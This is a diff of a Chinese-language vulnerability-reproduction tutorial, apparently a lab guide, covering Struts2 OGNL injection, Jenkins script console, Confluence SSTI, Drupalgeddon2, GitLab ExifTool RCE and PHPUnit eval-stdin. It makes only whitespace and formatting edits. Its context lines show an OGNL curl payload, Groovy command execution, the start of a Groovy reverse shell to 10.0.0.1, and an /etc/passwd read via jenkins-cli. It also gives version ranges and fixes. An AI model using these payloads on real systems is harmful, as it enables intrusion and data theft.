@@ -38,7 +38,6 @@ OGNL 表达式注入本质和 SSTI/SpEL 是同一个家族。
 
 
 **利用条件**：
-
 + 应用使用受影响 Struts2 版本
 + S2-057 需要 namespace 配置为通配或空
 + S2-061 默认配置可触发
@@ -56,7 +55,6 @@ curl "http://localhost:8080/%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBE
 ```
 
 URL 解码后核心是 OGNL 表达式：
-
 ```plain
 ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
 (#ct=#request['struts.valueStack'].context).
@@ -317,7 +315,7 @@ gixy /etc/nginx/nginx.conf
 ```
 
 ## 4.5 修复建议
-1. **修改 **`php.ini`：`cgi.fix_pathinfo=0`
+1. **修改**`php.ini`：`cgi.fix_pathinfo=0`
 2. **Nginx 配置显式区分 PHP**：
 
 ```nginx
@@ -357,7 +355,6 @@ http://target:8080/script
 ```
 
 输入：
-
 ```groovy
 def cmd = "id".execute()
 println cmd.text
@@ -393,7 +390,6 @@ python exploit.py http://target:8080/
 ```
 
 或直接用工具：
-
 ```bash
 git clone https://github.com/gquere/persistence_monitoring
 # 或 JenkinsExploit-GUI
@@ -406,7 +402,6 @@ curl -X POST http://target:8080/script \
 ```
 
 Groovy 一键反弹 shell：
-
 ```groovy
 String host="10.0.0.1";
 int port=4444;
@@ -451,13 +446,11 @@ jenkins-cli.jar -http http://target/ help 1 '@/etc/passwd'
 # 第 6 关 Confluence SSTI（CVE-2019-3396）
 ## 6.1 产品介绍
 **Atlassian Confluence** 是企业级 Wiki / 协作平台，常用于团队知识库、文档管理。
-
 + 默认端口 8090
 + 用 Java + Freemarker 模板引擎
 
 ## 6.2 漏洞背景
 2019 年 3 月披露。漏洞根因：
-
 + 富文本编辑器 widget connector 接受 `_template` 参数
 + `_template` 指定渲染模板路径，未做严格限制
 + 攻击者指定任意路径（包括 webapps 目录、远程模板）作为模板
@@ -470,9 +463,7 @@ jenkins-cli.jar -http http://target/ help 1 '@/etc/passwd'
 | 6.7.0 - 6.12.2 | 可利用 |
 | 6.13.0+ / 6.6.13+ | 已修复 |
 
-
 **利用条件**：
-
 + 无需认证（具体 payload 视版本）
 
 ## 6.4 复现过程
@@ -550,7 +541,6 @@ evil.ftl 内容：
 # 第 7 关 Drupal Drupalgeddon2（CVE-2018-7600）
 ## 7.1 产品介绍
 **Drupal** 是世界三大开源 CMS 之一（与 WordPress、Joomla 并列），国外政府、大学、企业大量使用。
-
 + 用 PHP 写，模块化
 + 默认端口 80
 
@@ -572,7 +562,6 @@ evil.ftl 内容：
 
 
 **利用条件**：
-
 + 无需认证
 + 默认安装即可触发
 
@@ -659,7 +648,6 @@ python3 gen_malware.py
 ```
 
 或手工构造：
-
 ```python
 # 构造 DJVU 文件，把 metadata 字段嵌入 perl 命令
 # payload 内容：
@@ -697,27 +685,24 @@ python CVE-2021-22205.py -t http://target/ -c "bash -c ..."
 
 ## 9.2 漏洞背景
 2017 年披露。漏洞根因：
-
 + PHPUnit 在 `phpunit/src/Util/PHP/eval-stdin.php` 中存在 `eval()` 调用
 + 该文件根据 HTTP 请求 body 直接 eval 执行
 + 当 vendor 目录被部署到 web 可访问目录（即用户能直接访问 `vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`）时，攻击者可远程执行任意 PHP 代码
 
 虽然这个漏洞看起来"很简单"，但**互联网上仍有大量未修复目标**，原因是：
-
 + PHPUnit 通过 Composer 安装，vendor 目录常被开发者误暴露
 + 老项目长期不升级
 
 ## 9.3 利用条件与版本
-| 版本 | 漏洞 |
-| --- | --- |
+| 版本                      | 漏洞  |
+| ----------------------- | --- |
 | PHPUnit 4.8.19 - 4.8.27 | 可利用 |
-| PHPUnit 5.0.10 - 5.6.2 | 可利用 |
-| PHPUnit 6.0.0 - 6.0.4 | 可利用 |
-| 后续版本 | 已修复 |
+| PHPUnit 5.0.10 - 5.6.2  | 可利用 |
+| PHPUnit 6.0.0 - 6.0.4   | 可利用 |
+| 后续版本                    | 已修复 |
 
 
 **利用条件**：
-
 + vendor 目录可被 Web 访问
 + 漏洞文件存在于上述路径
 
